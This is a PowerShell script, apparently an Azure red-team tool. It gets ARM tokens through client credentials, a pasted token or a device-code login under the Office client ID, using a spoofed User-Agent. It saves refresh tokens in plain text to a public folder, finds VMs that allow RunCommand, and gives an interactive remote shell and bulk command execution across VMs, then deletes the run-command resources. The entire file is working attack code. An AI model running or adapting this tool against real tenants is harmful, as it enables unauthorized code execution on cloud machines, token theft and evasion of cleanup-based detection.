function Invoke-VMRunCommand {
    param (
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$IdentityARM,
        [string]$TenantName
    )

#######################################################################################################
#######################################################################################################
$global:AuthMethod = $null
$global:CID = $null
$global:CSecret = $null
$global:TenantID = $null
$global:AccessToken = $null
$global:RefreshTkn = $null

#######################################################################################################

function Get-AuthHeaders {

    if (-not $global:AccessToken) { 
        throw "[-] No AccessToken." 
    }
    return @{ 
        "Authorization" = "Bearer $($global:AccessToken)"
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
    }
}

#######################################################################################################

function Invoke-TokenRequest {

    param(
        [string]$Scope, 
        [string]$ClientID, 
        [string]$ClientSecret, 
        [string]$RefreshToken, 
        [string]$TenantID
    )

    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"

    if ($ClientID -and $ClientSecret) {
         $body = @{ 
            "grant_type"="client_credentials"
            "scope"=$Scope
            "client_id"=$ClientID
            "client_secret"=$ClientSecret 
        } 
    }

    elseif ($RefreshToken) {
         $body = @{ 
            "client_id"="d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "scope"= $Scope
            "grant_type"="refresh_token"
            "refresh_token"=$RefreshToken 
            } 
        }

    else {
         return $null 
    }
    
    try { 
        $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"

        if ($resp.refresh_token) {
             $global:RefreshTkn = $resp.refresh_token; Set-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $resp.refresh_token 
        }
        return $resp.access_token 
    } catch {
         return $null 
    }
}

#######################################################################################################

function Invoke-RenewToken {

    Write-Host "`t[!] Token expired - renewing..." -ForegroundColor Yellow

    switch ($global:AuthMethod) {

        "ClientCredentials" {
            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID
            if ($global:AccessToken) {
                 return $global:AccessToken 
            }
            throw "[-] Renewal failed." 
        }

        "RefreshToken" {
             $rt = if (Test-Path "C:\Users\Public\RefreshToken.txt") {
                 Get-Content "C:\Users\Public\RefreshToken.txt" 
                } else {
                     $global:RefreshTkn 
                }
                $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -RefreshToken $rt -TenantID $global:TenantID
                if ($global:AccessToken) {
                     return $global:AccessToken 
                } 
                throw "[-] Renewal failed." 
        }

        "Manual" {
             Write-Host "`t[?] Paste new ARM AccessToken:" -ForegroundColor Cyan; $t = Read-Host "`tToken"
             if ([string]::IsNullOrWhiteSpace($t)) {
                 throw "[-] No token." 
            }
            $global:AccessToken = $t.Trim()
            return $global:AccessToken 
        }

        default {
             throw "[-] Unknown auth." 
        }
    }
}

#######################################################################################################

function Invoke-SmartRequest {

    param(
        [string]$Method="GET", 
        [string]$Uri, 
        [hashtable]$Headers=$null, 
        $Body=$null, 
        [string]$ContentType=$null, 
        [int]$MaxRetries=15
    )

    if (-not $Headers) {
         $Headers = Get-AuthHeaders 
    }

    $rc=0
    $tr=$false
    $ok=$false
    $resp=$null

    while (-not $ok -and $rc -lt $MaxRetries) {
        try { 
            $p=@{
                Method=$Method
                Uri=$Uri
                Headers=$Headers
            }

            if($null -ne $Body){
                $p['Body']=$Body
            }

            if($ContentType){
                $p['ContentType']=$ContentType
            }

            $resp=Invoke-RestMethod @p; $ok=$true
        }
        catch {
            $err=$_

            $code=if($err.Exception.Response){
                    [int]$err.Exception.Response.StatusCode
                }else{
                    $null
                }

            if ($code -eq 429) {
                 $rc++
                 $ra=$err.Exception.Response.Headers["Retry-After"]

                 $w=if(-not [string]::IsNullOrWhiteSpace($ra)){
                    [int]($ra -join '')
                    }
                    else{
                        10*$rc
                    }
                    
                    Write-Host "`t[!] 429 - $w sec" -ForegroundColor Gray; Start-Sleep $w 
            }

            elseif ($code -eq 401) {
                 if($tr){
                    throw "[-] 401 after renewal."
                }
                
                Invoke-RenewToken|Out-Null; $Headers["Authorization"]="Bearer $($global:AccessToken)"
                $tr=$true 
            }

            elseif ($code -eq 403) {
                 throw "FORBIDDEN:$Uri" 
            }

            elseif ($code -eq 404) {
                 return $null 
            }

            elseif ($null -eq $code -or $code -ge 500) {
                 $rc++; Start-Sleep (5*$rc) 
                 }

            else {
                 throw $err 
            }
        }
    }
    if (-not $ok) {
         throw "[-] Failed: $Uri" 
    }

    return $resp
}

#######################################################################################################

function Get-DomainName { 
    param(
        [string]$DomainName
    )

    try {
         $r=Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
         $t=($r.issuer -split "/")[3]
         Write-Host "[#] Tenant: $t" -ForegroundColor DarkYellow; return $t 
    } 
    catch {
         return $null 
    }
}

#######################################################################################################

function Invoke-GetTokens {
     param(
        [string]$DomainName, 
        [string]$ClientID, 
        [string]$ClientSecret, 
        [string]$ARMToken
    )

    if ($ARMToken) {
         $global:AuthMethod="Manual"
         $global:AccessToken=$ARMToken
         Write-Host "[+] Token set (Manual)" -ForegroundColor Green
         return $global:AccessToken 
    }

    if ($DomainName) {
         $global:TenantID = Get-DomainName -DomainName $DomainName
         if (-not $global:TenantID) {
             return $null 
            } 
    }

    if ($ClientID -and $ClientSecret) {
        $global:AuthMethod="ClientCredentials"
        $global:CID=$ClientID
        $global:CSecret=$ClientSecret

        $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $global:TenantID

        if ($global:AccessToken) {
             Write-Host "[+] Token acquired (ClientCredentials)" -ForegroundColor Green
             return $global:AccessToken 
        }
        return $null 
    }

    $global:AuthMethod="RefreshToken"
    $rp="C:\Users\Public\RefreshToken.txt"

    if (Test-Path $rp) {
        Write-Host "[?] Found RefreshToken" -ForegroundColor DarkYellow; $u=Read-Host "    Use it? (Y/N)"

        if ($u -match "^[Yy]") {
            $rt=Get-Content $rp; $global:AccessToken=Invoke-TokenRequest -Scope "https://management.azure.com/.default" -RefreshToken $rt -TenantID $global:TenantID
             
            if ($global:AccessToken) {
                Write-Host "[+] Token acquired (RefreshToken)" -ForegroundColor Green
                return $global:AccessToken 
            }
            Write-Host "[!] Failed, falling back..." -ForegroundColor Yellow 
        } 
    }

    $ar=Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body @{"client_id"="d3590ed6-52b3-4102-aeff-aad2292ab01c";"resource"="https://management.azure.com"}

    Write-Host "`n[#] Code:" -ForegroundColor DarkYellow -NoNewline; Write-Host " $($ar.user_code)" -ForegroundColor White

    Start-Sleep 5; Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

    $tb=@{
        "scope"="openid"
        "client_id"="d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "grant_type"="urn:ietf:params:oauth:grant-type:device_code"
        "code"=$ar.device_code
    }

    while($true){
        try{
            $tr=Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0" -Body $tb -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
            if($tr.refresh_token){
                Set-Content -Path $rp -Value $tr.refresh_token;$global:RefreshTkn=$tr.refresh_token
            }

            $global:AccessToken=$tr.access_token;Write-Host "[+] Token acquired" -ForegroundColor Green
            return $global:AccessToken
        }catch{
            $e=$_.ErrorDetails.Message|ConvertFrom-Json
            if($e.error -eq "authorization_pending"){
                Start-Sleep 5
            }else{
                Write-Host "[-] $($e.error)" -ForegroundColor Red
                return $null
            }
        }
    }
}


#######################################################################################################

function Test-OpAllowed {
     param(
        [string[]]$Allowed,
        [string[]]$Denied,
        [string]$Operation
    )

    $m=$false
    foreach($a in $Allowed){
        if($Operation -like $a){
            $m=$true;break
        }
    }
    
    if(-not $m){
        return $false
    }
    
    foreach($d in $Denied){
        if($Operation -like $d){
            return $false
        }
    }
    
    return $true
}

#######################################################################################################
#######################################################################################################

function Get-AllVMsWithPermissions {

    param(
        [hashtable]$Headers
    )

    Write-Host "`n[*] Enumerating Subscriptions..." -ForegroundColor Cyan
    $subResp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $Headers

    if (-not $subResp -or -not $subResp.value) {
         Write-Host "[-] No subscriptions." -ForegroundColor Red
         return @() 
    }


    $subs = @($subResp.value | ForEach-Object { [PSCustomObject]@{ Name=$_.displayName; Id=$_.subscriptionId; State=$_.state } })

    Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green

    Write-Host "`n[*] Discovering VMs and checking RunCommand permissions..." -ForegroundColor Cyan
    $allVMs = @()

    foreach ($sub in $subs) {

        if ($sub.State -ne "Enabled") {
             continue 
        }
        Write-Host "  [>] $($sub.Name)" -ForegroundColor DarkGray

        $vmUri = "https://management.azure.com/subscriptions/$($sub.Id)/providers/Microsoft.Compute/virtualMachines?api-version=2024-03-01"
        $vmResp = Invoke-SmartRequest -Uri $vmUri -Headers $Headers
        
        if (-not $vmResp -or -not $vmResp.value) {
             continue 
        }

        foreach ($vm in $vmResp.value) {
            $rgMatch = $vm.id -match "/resourceGroups/([^/]+)/"
            $rg = if ($rgMatch) { $Matches[1] } else { "Unknown" }

            # Detect OS
            $isWindows = $true
            if ($vm.properties.storageProfile.osDisk.osType -eq "Linux") {
                 $isWindows = $false 
            }

            elseif ($vm.properties.osProfile.linuxConfiguration) {
                 $isWindows = $false 
            }

            $osType = if ($isWindows) {
                 "Windows" 
            } else {
                 "Linux" 
            }

            # Power state
            $powerState = "Unknown"
            $statusUri = "https://management.azure.com$($vm.id)/instanceView?api-version=2024-03-01"

            try {
                $statusResp = Invoke-SmartRequest -Uri $statusUri -Headers $Headers
                $ps = ($statusResp.statuses | Where-Object { $_.code -match "PowerState" }).code
                $powerState = if ($ps) {
                     ($ps -split "/")[1] 
                } else {
                     "Unknown" 
                }

            } catch {

            }

            # Check RunCommand permission
            $permUri = "https://management.azure.com$($vm.id)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            $canRunCommand = $false
            $canExtension = $false
            $role = "No Access"

            try {
                $permResp = Invoke-SmartRequest -Uri $permUri -Headers $Headers
                if ($permResp -and $permResp.value) {
                    $allow = @(); $deny = @()
                    foreach ($p in $permResp.value) {
                        if ($p.actions) {
                             $allow += $p.actions 
                        }

                        if ($p.notActions) {
                             $deny += $p.notActions 
                        }
                    }

                    $allow = $allow | Select-Object -Unique
                    $deny = $deny | Select-Object -Unique

                    $hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
                    $canRBAC = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
                    $canRunCommand = $hasStar -or (Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Compute/virtualMachines/runCommand/action') -or (Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Compute/virtualMachines/runCommands/*')
                    $canExtension = $hasStar -or (Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Compute/virtualMachines/extensions/*')

                    $role = if ($canRBAC -and $hasStar) {
                                "Owner" 
                            }
                            elseif ($hasStar) {
                                 "Contributor" 
                            }
                            elseif ($canRunCommand) {
                                 "RunCommand" 
                            }
                            else {
                                 "Limited" 
                            }
                }
            } catch {

            }

            $color = if ($canRunCommand -and $powerState -eq "running") {
                        "Green" 
                    }
                     elseif ($canRunCommand) {
                         "Yellow" 
                    }
                     else {
                         "DarkGray" 
                    }

            Write-Host "    [>] $($vm.name) [$rg] $osType $powerState -> " -NoNewline -ForegroundColor DarkGray
            Write-Host "$role" -ForegroundColor $color

            $allVMs += [PSCustomObject]@{
                Name = $vm.name
                ResourceGroup  = $rg
                SubscriptionId = $sub.Id
                SubName = $sub.Name
                ResourceId = $vm.id
                OS = $osType
                PowerState = $powerState
                Role = $role
                CanRunCommand = $canRunCommand
                CanExtension = $canExtension
                Location = $vm.location
            }
        }
    }

    return $allVMs
}

#######################################################################################################
#######################################################################################################

function Invoke-VMRunCommand {

    param(
        [PSCustomObject]$VM,
        [string]$Command,
        [hashtable]$Headers
    )

    $commandId = if ($VM.OS -eq "Windows") {
         "RunPowerShellScript" 
    } else {
         "RunShellScript" 
    }

    $uri = "https://management.azure.com$($VM.ResourceId)/runCommand?api-version=2024-03-01"

    $body = @{
        commandId = $commandId
        script = @($Command)
    } | ConvertTo-Json -Depth 5

    try {
        $webResp = Invoke-WebRequest -Method POST -Uri $uri -Headers $Headers -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction Stop

        if ($webResp.StatusCode -eq 200) {
            $respObj = $webResp.Content | ConvertFrom-Json
            $stdout = ($respObj.value | Where-Object { $_.code -match "StdOut" }).message
            $stderr = ($respObj.value | Where-Object { $_.code -match "StdErr" }).message

            return @{ 
                Success=$true
                StdOut=$stdout
                StdErr=$stderr
                VMName=$VM.Name 
            }
        }

        if ($webResp.StatusCode -eq 202) {

            $pollUrl = $null
            if ($webResp.Headers["Location"]) {
                 $pollUrl = $webResp.Headers["Location"] -join '' 
            }

            elseif ($webResp.Headers["Azure-AsyncOperation"]) {
                 $pollUrl = $webResp.Headers["Azure-AsyncOperation"] -join '' 
            }

            if (-not $pollUrl) {
                return @{ 
                    Success=$false
                    StdOut=""
                    StdErr="202 but no poll URL"
                    VMName=$VM.Name 
                }
            }

            $maxWait = 300
            $start = Get-Date

            while (((Get-Date) - $start).TotalSeconds -lt $maxWait) {
                Start-Sleep -Seconds 5
                try {
                    $pollResp = Invoke-WebRequest -Method GET -Uri $pollUrl -Headers $Headers -UseBasicParsing -ErrorAction Stop

                    if ($pollResp.StatusCode -eq 200) {
                        $pollObj = $pollResp.Content | ConvertFrom-Json

                        if ($pollObj.status) {
                            if ($pollObj.status -eq "Succeeded") {

                                if ($pollObj.properties -and $pollObj.properties.output) {

                                    $resultObj = $pollObj.properties.output
                                    $stdout = ($resultObj.value | Where-Object { $_.code -match "StdOut" }).message
                                    $stderr = ($resultObj.value | Where-Object { $_.code -match "StdErr" }).message
                                    return @{ 
                                        Success=$true
                                        StdOut=$stdout
                                        StdErr=$stderr
                                        VMName=$VM.Name 
                                    }
                                }

                                if ($webResp.Headers["Location"]) {
                                    $locUrl = $webResp.Headers["Location"] -join ''
                                    try {
                                        $locResp = Invoke-WebRequest -Method GET -Uri $locUrl -Headers $Headers -UseBasicParsing -ErrorAction Stop
                                        $locObj = $locResp.Content | ConvertFrom-Json
                                        $stdout = ($locObj.value | Where-Object { $_.code -match "StdOut" }).message
                                        $stderr = ($locObj.value | Where-Object { $_.code -match "StdErr" }).message
                                        return @{ Success=$true; StdOut=$stdout; StdErr=$stderr; VMName=$VM.Name }
                                    } catch { 

                                    }
                                }
                                return @{ 
                                    Success=$true
                                    StdOut="(completed, no output captured)"
                                    StdErr=""
                                    VMName=$VM.Name 
                                }
                            }

                            elseif ($pollObj.status -eq "Failed") {
                                $errMsg = if ($pollObj.error) {
                                            $pollObj.error.message 
                                        } else {
                                             "Unknown error" 
                                        }

                                return @{ 
                                    Success=$false
                                    StdOut=""
                                    StdErr=$errMsg
                                    VMName=$VM.Name 
                                }
                            }


                        }
                        else {
                            $stdout = ($pollObj.value | Where-Object { $_.code -match "StdOut" }).message
                            $stderr = ($pollObj.value | Where-Object { $_.code -match "StdErr" }).message
                            return @{ 
                                Success=$true
                                StdOut=$stdout
                                StdErr=$stderr
                                VMName=$VM.Name 
                            }
                        }
                    }
                } catch {

                }
            }

            return @{ 
                Success=$false
                StdOut=""
                StdErr="Timeout waiting for result"
                VMName=$VM.Name 
            }
        }

        return @{ 
            Success=$false
            StdOut=""
            StdErr="Unexpected status: $($webResp.StatusCode)"
            VMName=$VM.Name 
        }
    }

    catch {
        return @{ 
            Success=$false
            StdOut=""
            StdErr=$_.ToString()
            VMName=$VM.Name 
        }
    }
}

#######################################################################################################
#######################################################################################################

function Invoke-BulkRunCommand {
    param(
        [array]$VMs,
        [string]$Command,
        [hashtable]$Headers
    )

    $cmdName = "ART-Cmd-$(Get-Random -Maximum 99999)"
    $jobs = @()

    Write-Host "`n  [*] Firing command on $($VMs.Count) VMs..." -ForegroundColor Cyan

    foreach ($vm in $VMs) {
        $commandId = if ($vm.OS -eq "Windows") { "RunPowerShellScript" } else { "RunShellScript" }
        $runCmdUri = "https://management.azure.com$($vm.ResourceId)/runCommands/$cmdName`?api-version=2023-03-01"

        $body = @{
            location = $vm.Location
            properties = @{
                source = @{ script = $Command }
                asyncExecution  = $false
                timeoutInSeconds = 300
            }
        } | ConvertTo-Json -Depth 10

        try {
            $null = Invoke-SmartRequest -Method "PUT" -Uri $runCmdUri -Headers $Headers -Body $body -ContentType "application/json"
            Write-Host "    [>] $($vm.Name) - fired" -ForegroundColor DarkGray
            $jobs += [PSCustomObject]@{
                VM = $vm
                Uri = $runCmdUri
                Name = $cmdName
            }
        }
        catch {
            Write-Host "    [-] $($vm.Name) - failed to fire: $_" -ForegroundColor Red
        }
    }

    if ($jobs.Count -eq 0) {
         return 
    }


    Write-Host "`n  [*] Waiting for results..." -ForegroundColor Cyan
    $maxWait = 300
    $start = Get-Date
    $completed = @{}

    while ($completed.Count -lt $jobs.Count -and ((Get-Date) - $start).TotalSeconds -lt $maxWait) {
        foreach ($job in $jobs) {
            if ($completed.ContainsKey($job.VM.Name)) { continue }

            try {
                $status = Invoke-SmartRequest -Uri $job.Uri -Headers $Headers
                $state = $status.properties.provisioningState

                if ($state -eq "Succeeded") {
                    $output = ""
                    $errout = ""
                    if ($status.properties.instanceView) {
                        $output = $status.properties.instanceView.output
                        $errout = $status.properties.instanceView.error
                    }
                    $completed[$job.VM.Name] = @{ 
                        StdOut = $output
                        StdErr = $errout
                        Success = $true 
                    }
                }
                elseif ($state -eq "Failed") {
                    $completed[$job.VM.Name] = @{ 
                        StdOut = ""
                        StdErr = "Provisioning failed"
                        Success = $false 
                    }
                }
            } catch { }
        }

        if ($completed.Count -lt $jobs.Count) {
             Start-Sleep -Seconds 5 
        }
    }

    # Display results
    Write-Host "`n" -NoNewline
    foreach ($job in $jobs) {
        $vmName = $job.VM.Name
        Write-Host "  .. $vmName .." -ForegroundColor Cyan

        if ($completed.ContainsKey($vmName)) {
            $r = $completed[$vmName]
            if ($r.StdOut) {
                 Write-Host $r.StdOut -ForegroundColor White 
            }
            if ($r.StdErr) {
                 Write-Host $r.StdErr -ForegroundColor Red 
            }
        }
        else {
            Write-Host "  (timeout - no response)" -ForegroundColor Yellow
        }
        Write-Host ""
    }

    # Cleanup: delete run command resources
    foreach ($job in $jobs) {
        try { $null = Invoke-SmartRequest -Method "DELETE" -Uri $job.Uri -Headers $Headers } catch { }
    }
}

#######################################################################################################
#######################################################################################################

function Start-VMShell {
    param(
        [PSCustomObject]$VM,
        [hashtable]$Headers
    )

    $prompt = if ($VM.OS -eq "Windows") {
         "PS" 
    } else {
         "$" 
    }

    Write-Host "`n  [*] Connected to $($VM.Name) ($($VM.OS))" -ForegroundColor Green
    Write-Host "  [*] Type 'exit' to disconnect, 'upload <local> <remote>' for file ops" -ForegroundColor DarkGray
    Write-Host ""

    while ($true) {
        Write-Host "  [$($VM.Name)] $prompt " -ForegroundColor Red -NoNewline
        $cmd = Read-Host

        if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
        if ($cmd -match "^(exit|quit)$") { break }

        Write-Host ""
        $result = Invoke-VMRunCommand -VM $VM -Command $cmd -Headers $Headers

        if ($result.StdOut) {
            Write-Host $result.StdOut -ForegroundColor White
        }
        if ($result.StdErr) {
            Write-Host $result.StdErr -ForegroundColor Red
        }
        if (-not $result.Success) {
            Write-Host "  [!] Command execution failed" -ForegroundColor Red
        }
        Write-Host ""
    }

    Write-Host "  [*] Disconnected from $($VM.Name)" -ForegroundColor DarkGray
}

#######################################################################################################
#######################################################################################################

function Show-VMMenu {
    param([array]$VMs)

    Write-Host ""
    Write-Host " - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  " -ForegroundColor DarkCyan
    Write-Host "    #ID     VM Name             OS          RG              Perm" -ForegroundColor White
    Write-Host " - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  " -ForegroundColor DarkCyan

    for ($i = 0; $i -lt $VMs.Count; $i++) {
        $v = $VMs[$i]
        $num = ($i + 1).ToString().PadRight(5)
        $name = $v.Name.PadRight(24).Substring(0, [Math]::Min(24, $v.Name.Length))
        $os = $v.OS.PadRight(10)
        $state = $v.PowerState.PadRight(11)
        $rg = $v.ResourceGroup.PadRight(24).Substring(0, [Math]::Min(24, $v.ResourceGroup.Length))
        $sub = $v.SubName.PadRight(20).Substring(0, [Math]::Min(20, $v.SubName.Length))
        $perm= $v.Role

        $stateColor = if ($v.PowerState -eq "running") { "Green" } elseif ($v.PowerState -eq "deallocated") { "DarkGray" } else { "Yellow" }
        $permColor  = if ($v.CanRunCommand -and $v.PowerState -eq "running") { "Green" } elseif ($v.CanRunCommand) { "Yellow" } else { "DarkGray" }

        #Write-Host "    $num    $name  $os  $rg  $perm" -NoNewline -ForegroundColor Gray
        Write-Host "    [$num] $name $os [$rg] " -NoNewline -ForegroundColor DarkGray
        #Write-Host "$name" -NoNewline -ForegroundColor Cyan
        #Write-Host "$os " -NoNewline -ForegroundColor Gray
        #Write-Host "$state " -NoNewline -ForegroundColor $stateColor
        #Write-Host "$rg     " -NoNewline -ForegroundColor DarkGray
        #Write-Host "$sub " -NoNewline -ForegroundColor DarkGray
        Write-Host "$perm   " -ForegroundColor $permColor
        #write-host " "
    }

    Write-Host " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = " -ForegroundColor DarkCyan
    Write-Host "  [S] Shell on single VM  |  [B] Rrun command on multiple VMs  |  [R] Refresh  |  [Q] Quit" -ForegroundColor DarkYellow
    Write-Host ""
}

#######################################################################################################
#######################################################################################################

function main {
    param(
        [string]$ClientID, 
        [string]$ClientSecret, 
        [string]$IdentityARM, 
        [string]$TenantName
    )

    if (-not $TenantName) {
         Write-Host "[-] Must specify TenantName" -ForegroundColor Red
         return 
    }

    $global:TenantID = Get-DomainName -DomainName $TenantName

    if (-not $global:TenantID) {
         return 
    }

    if ($IdentityARM) {
         Invoke-GetTokens -ARMToken $IdentityARM | Out-Null 
    }

    elseif ($ClientID -and $ClientSecret) {
         Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null 
    }

    else {
         Invoke-GetTokens -DomainName $TenantName | Out-Null 
    }

    if (-not $global:AccessToken) {
         Write-Host "[-] No token." -ForegroundColor Red
         return 
    }

    $headers = Get-AuthHeaders

    $allVMs = @(Get-AllVMsWithPermissions -Headers $headers)
    $runnableVMs = @($allVMs | Where-Object { $_.CanRunCommand })

    if ($runnableVMs.Count -eq 0) {
        Write-Host "`n[-] No VMs with RunCommand permissions found." -ForegroundColor Red
        if ($allVMs.Count -gt 0) {
            Write-Host "[!] Found $($allVMs.Count) VM(s) but no RunCommand access." -ForegroundColor Yellow
        }
        return
    }

    Write-Host "`n[+] $($runnableVMs.Count) VM(s) with RunCommand access ($($allVMs.Count) total)" -ForegroundColor Green

    while ($true) {
        Show-VMMenu -VMs $runnableVMs

        $choice = Read-Host "Action"

        if ($choice -match "^[Qq]$") {
            Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
            break
        }
        if ($choice -match "^[Rr]$") {
            Write-Host "`n[*] Refreshing VM list..." -ForegroundColor Cyan
            $headers = Get-AuthHeaders
            $allVMs = @(Get-AllVMsWithPermissions -Headers $headers)
            $runnableVMs = @($allVMs | Where-Object { $_.CanRunCommand })
            continue
        }

        if ($choice -match "^[Ss]$") {
            $vmChoice = Read-Host "  VM # for shell"
            $idx = [int]$vmChoice - 1
            if ($idx -lt 0 -or $idx -ge $runnableVMs.Count) { Write-Host "  [!] Invalid." -ForegroundColor Red; continue }

            $selectedVM = $runnableVMs[$idx]
            if ($selectedVM.PowerState -ne "running") {
                Write-Host "  [!] VM is $($selectedVM.PowerState) - cannot run commands." -ForegroundColor Yellow
                continue
            }

            Start-VMShell -VM $selectedVM -Headers $headers
            continue
        }
        if ($choice -match "^[Bb]$") {
            Write-Host "  Select VMs (comma-separated numbers, or 'all' for all running):" -ForegroundColor Cyan
            $vmSelection = Read-Host "  VMs"

            $selectedVMs = @()
            if ($vmSelection -match "^all$") {
                $selectedVMs = @($runnableVMs | Where-Object { $_.PowerState -eq "running" })
            }
            else {
                $indices = $vmSelection -split ',' | ForEach-Object { ([int]$_.Trim()) - 1 }
                foreach ($idx in $indices) {
                    if ($idx -ge 0 -and $idx -lt $runnableVMs.Count) {
                        $vm = $runnableVMs[$idx]
                        if ($vm.PowerState -eq "running") {
                            $selectedVMs += $vm
                        }
                        else {
                            Write-Host "  [!] $($vm.Name) is $($vm.PowerState) - skipping" -ForegroundColor Yellow
                        }
                    }
                }
            }

            if ($selectedVMs.Count -eq 0) {
                Write-Host "  [!] No running VMs selected." -ForegroundColor Red
                continue
            }

            Write-Host "  [*] Selected $($selectedVMs.Count) VM(s): $($selectedVMs.Name -join ', ')" -ForegroundColor Green
            $bulkCmd = Read-Host "  Command"

            if ([string]::IsNullOrWhiteSpace($bulkCmd)) { continue }

            Invoke-BulkRunCommand -VMs $selectedVMs -Command $bulkCmd -Headers $headers
            continue
        }
        if ($choice -match "^\d+$") {
            $idx = [int]$choice - 1
            if ($idx -ge 0 -and $idx -lt $runnableVMs.Count) {
                $selectedVM = $runnableVMs[$idx]
                if ($selectedVM.PowerState -ne "running") {
                    Write-Host "  [!] VM is $($selectedVM.PowerState)" -ForegroundColor Yellow
                    continue
                }
                Start-VMShell -VM $selectedVM -Headers $headers
            }
            else { Write-Host "  [!] Invalid." -ForegroundColor Red }
            continue
        }

        Write-Host "  [!] Unknown action. Use S/B/R/Q or a VM number." -ForegroundColor Red
    }
}

main -ClientID $ClientID -ClientSecret $ClientSecret -IdentityARM $IdentityARM -TenantName $TenantName

}
